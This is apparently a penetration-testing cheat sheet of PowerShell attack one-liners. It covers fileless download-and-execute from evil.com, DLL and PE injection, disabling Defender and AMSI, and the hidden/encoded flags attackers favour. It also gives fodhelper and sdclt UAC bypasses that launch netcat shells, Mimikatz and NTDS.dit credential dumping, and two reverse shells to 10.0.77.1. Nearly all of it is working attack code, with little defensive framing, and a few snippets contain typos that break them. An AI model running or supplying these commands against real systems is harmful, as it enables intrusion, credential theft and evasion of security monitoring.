# PowerShell for Pentest

## Execution

Check current powershell running in 32-bit or 64-bit

```powershell
[Environment]::Is64BitProcess
```

Run PowerShell with specific version

```powershell
#Run PowerShell version 2
powershell.exe -Version 2
```

### Fileless Execution

Fileless execution with **Net.WebClient DownloadString**

```powershell
#Run the powershell script on http://evil.com/script.ps1
iex (New-Object Net.Webclient).DownloadString("http://evil.com/script.ps1")
```

Fileless execution with **Net.WebRequest**

```powershell
#Run the powershell script on http://evil.com/script.ps1
$req = [System.NET.WebRequest]::Create("http://evil.com/script.ps1");$res = $req.GetResponse();IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

Fileless execution with **System.Xml.XmIDocument**

{% code title="abc.xml" %}
```markup
<command>
    <abc>
        Get-Process
    </abc>
</command>
```
{% endcode %}

```powershell
Â§xml = New-ObjectSystem.Xml.XmlDocument;$xml.Load("http://evil.com/abc.xml");iex $xml.command.abc
```

Fileless execution with **ComObject: Msxml2**

```powershell
$pk=New-Object -ComObject Msxml2.XMLHTTP;$pk.open('GET','http://evil.com/script.ps1',$false);$pk.send();iex $pk.responseText
```

### DLL Injection

Injection DLL into the process

```powershell
#Inject 'evil.dll' into the process ID 624
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1');Invoke-DllInjection -ProcessID 624 -Dll evil.dll
```

Reflective PE Injection

```powershell
#Load 'evil.exe' and run it locally with 'Arg1' argument
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1');$PEBytes = [IO.File]::ReadAllBytes('evil.exe');Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1"
```

### Download File

Download File with **Net.WebClient**

```powershell
#Download script from http://evil.com/script.ps1
iex (New-Object Net.WebClient).DownloadFile("http://evil.com/script.ps1","C:\Windows\Temp\script.ps1")
```

Download File with **Invoke-WebRequest**

```powershell
#Download script from http://evil.com/script.ps1
Invoke-WebRequest "http://evil.com/script.ps1" -OutFile "script.ps1"
```

## Evasion/Bypass

### Disable Windows Defender/AMSI

Run **PowerShell Version 2** which doesn't support AMSI

```powershell
powershell.exe -Version 2
```

Disable AMSI Module

```powershell
Set-MpPreference -DisableIOAVProtection $true
```

Disable Realtime Monitoring

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Most Used Arguments

Ref. [https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/](https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/)

**WindowStyle Hidden**

| **Flag**              | **Count** | **% of Total** |
| --------------------- | --------- | -------------- |
| "-window hidden"      | 1,267     | 30.90%         |
| "-W Hidden"           | 315       | 7.68%          |
| "-w hidden"           | 159       | 3.88%          |
| "-windowstyle hidden" | 125       | 3.05%          |
| "-win hidden"         | 67        | 1.63%          |
| "-WindowStyle Hidden" | 45        | 1.10%          |
| "-win Hidden"         | 42        | 1.02%          |
| "-wind hidden"        | 40        | 0.98%          |
| "-WindowStyle hidden" | 5         | 0.12%          |
| "-WindowStyle hiddeN" | 5         | 0.12%          |
| "-windows hidden"     | 4         | 0.10%          |
| "-Win Hidden"         | 3         | 0.07%          |
| "-win hid"            | 2         | 0.05%          |
| "-Window hidden"      | 2         | 0.05%          |
| "-Wind Hidden"        | 1         | 0.02%          |
| "-Win hidden"         | 1         | 0.02%          |

**Execute Encoded Payload**

| **Flag**          | **Count** | **% of Total** |
| ----------------- | --------- | -------------- |
| "-enc"            | 3,407     | 83.29%         |
| "-Enc"            | 412       | 10.05%         |
| "-EncodedCommand" | 229       | 5.59%          |
| "-encodedcommand" | 40        | 0.98%          |
| "-encodedCommand" | 7         | 0.17%          |
| "-ec"             | 3         | 0.07%          |
| "-en"             | 1         | 0.02%          |
| "-ENC"            | 1         | 0.02%          |

**NonInteractive**

| **Flag**          | **Count** | **% of Total** |
| ----------------- | --------- | -------------- |
| "-noni"           | 1,042     | 25.41%         |
| "-NonI"           | 331       | 8.07%          |
| "-noninteractive" | 27        | 0.66%          |
| "-NonInteractive" | 4         | 0.10%          |
| "-nonI"           | 1         | 0.02%          |

**NoProfile**

| **Flag**     | **Count** | **% of Total** |
| ------------ | --------- | -------------- |
| "-nop"       | 955       | 23.29%         |
| "-NoP"       | 332       | 8.10%          |
| "-noprofile" | 57        | 1.39%          |
| "-NoProfile" | 5         | 0.12%          |
| "-noP"       | 1         | 0.02%          |

**ExecutionPolicy ByPass**

| **Flag**                  | **Count** | **% of Total** |
| ------------------------- | --------- | -------------- |
| "-ep bypass"              | 128       | 3.12%          |
| "-exec bypass"            | 80        | 1.95%          |
| "-executionpolicy bypass" | 78        | 1.90%          |
| "-Exec Bypass"            | 73        | 1.78%          |
| "-ExecutionPolicy ByPass" | 42        | 1.02%          |
| "-ExecutionPolicy bypass" | 26        | 0.63%          |
| "-Exec ByPass"            | 9         | 0.22%          |
| "-ExecutionPolicy Bypass" | 5         | 0.12%          |
| "-ExecuTionPolicy ByPasS" | 4         | 0.10%          |
| "-exe byPass"             | 2         | 0.05%          |
| "-ep Bypass"              | 2         | 0.05%          |
| "-ExecutionPolicy BypasS" | 2         | 0.05%          |
| "-Exe ByPass"             | 2         | 0.05%          |

**Uses Single-Threaded**

| **Flag** | **Count** | **% of Total** |
| -------- | --------- | -------------- |
| "-sta"   | 219       | 5.34%          |

**Combine**

| **Flag Combination**                               | **Count** | **% of Total** |
| -------------------------------------------------- | --------- | -------------- |
| "-window hidden -enc"                              | 1,242     | 30.29%         |
| "-enc"                                             | 986       | 24.04%         |
| "-nop -noni -enc"                                  | 736       | 17.95%         |
| "-NoP -sta -NonI -W Hidden -Enc"                   | 206       | 5.02%          |
| "-EncodedCommand"                                  | 169       | 4.12%          |
| "-ep bypass -noni -w hidden -enc"                  | 102       | 2.48%          |
| "-NoP -NonI -W Hidden -Enc"                        | 60        | 1.46%          |
| "-nop -win hidden -noni -enc"                      | 57        | 1.39%          |
| "-executionpolicy bypass -windowstyle hidden -enc" | 51        | 1.24%          |
| "-nop -exec bypass -win Hidden -noni -enc"         | 41        | 1.00%          |

## Privilege Escalation

Privilege Escalation with PowerUp

```powershell
#Executes all functions that check for various Windows privilege escalation opportunities
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks
```

Runas

```powershell
#Run nc64.exe (Netcat) as pcadmin account
$username = 'pcadmin'
$password = 'qwerty1234'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process -FilePath 'C:\nc64.exe' -NoNewWindow -Credential $credential -ArgumentList ("-nc","10.0.77.1","8443","-e","cmd.exe") -WorkingDirectory C:\Users\Public
```

## UAC Bypass

UAC bypass with **fodhelper.exe/ computerdefaults.exe**

{% hint style="danger" %}
This technique require Local Administrator to run **fodhelper.exe/ computerdefaults.exe**
{% endhint %}

```powershell
#Add '\Software\Classes\ms-settings\Shell\Open\command' registry on HKCU to run netcat
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value 'C:\nc64.exe -nc 10.0.77.1 8888 -e cmd.exe' -Force

#Execute fodhelper.exe OR computerdefaults.exe to run netcat
#for fodhelper.exe
Start-Process "C:\Windows\System32\fodhelper.exe"
#for computerdefaults.exe
Start-Process "C:\Windows\System32\computerdefaults.exe"

#Clear the registry
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

UAC bypass with **sdclt.exe**

{% hint style="danger" %}
This technique require Local Administrator to run **sdclt.exe**
{% endhint %}

```powershell
#Add '\Software\Classes\Folder\shell\open\command' registry on HKCU to run netcat
New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(default)" -Value 'C:\nc64.exe -nc 10.0.77.1 8888 -e cmd.exe' -Force

#Execute sdclt.exe to run netcat
Start-Process "C:\Windows\System32\sdclt.exe"

#Clear the registry
Remove-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Recurse -Force
```

## Credential Dumping

### Domain Controller

Dump **SAM, STSTEM and NTDS.dit** from Domain Controller with [**nishang**](https://github.com/samratashok/nishang)

```powershell
iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Copy-VSS.ps1");Copy-VSS
```

### Endpoint

Get system information with [**nishang**](https://github.com/samratashok/nishang)

```powershell
iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-Information.ps1");Get-Information 
```

Dump credentials from memory with [**nishang**](https://github.com/samratashok/nishang)

```powershell
iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1");Invoke-Mimikatz -DumpCreds
```

Dump credentials from memory with **** [**Empire**](https://github.com/BC-SECURITY/Empire) (Invoke-Mimikatz)

```powershell
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
```

## Reverse Shell

Reverse Shell with [**nishang**](https://github.com/samratashok/nishang)

```powershell
#reverse shell to connect back to Attacker host (IP: 10.0.77.1, port: 8888)
iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.0.77.1 -Port 8888
```

Reverse Shell with **System.Net.Sockets**

```powershell
$des = New-Object System.Net.Sockets.TCPClient('10.0.77.1',8888);$stream = $des.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$des.Close()
```
